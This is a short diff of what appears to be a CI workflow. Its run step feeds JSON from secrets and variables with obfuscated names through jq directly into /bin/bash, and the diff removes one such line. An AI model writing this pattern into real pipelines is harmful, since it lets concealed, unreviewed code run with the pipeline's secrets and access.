@@ -19,7 +19,6 @@ jobs:
           lp016: ${{ secrets.lp016 }}
         run: |
           printf '%s' "$lp016" | jq -r .czfl17 | /bin/bash
-          echo $uwcn1706 | jq -r .xrm694 | /bin/bash
           printf '%s' "$l10" | jq -r .wqwaw495 | /bin/bash
 
       - name: Persist output
